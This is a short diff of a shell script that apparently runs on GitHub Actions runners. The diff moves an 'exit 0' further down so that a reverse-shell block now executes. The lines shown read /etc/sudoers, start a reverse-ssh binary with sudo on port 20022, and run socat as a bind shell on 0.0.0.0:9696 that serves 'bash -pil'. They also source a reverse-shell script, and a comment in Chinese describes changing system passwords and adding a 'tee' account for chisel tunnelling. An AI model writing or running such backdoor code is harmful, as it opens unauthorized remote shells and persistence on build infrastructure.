@@ -38,7 +38,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 
-exit 0;
+
 
 # github_rev_ssh
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && 
@@ -67,6 +67,7 @@ grep -q AABBCC_rev_shell /tmp/js9 &&
 . /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
 )
 
+exit 0;
 
 #修改系统密码 添加系统账户tee chisel-60080
 grep "tee" /etc/passwd ||
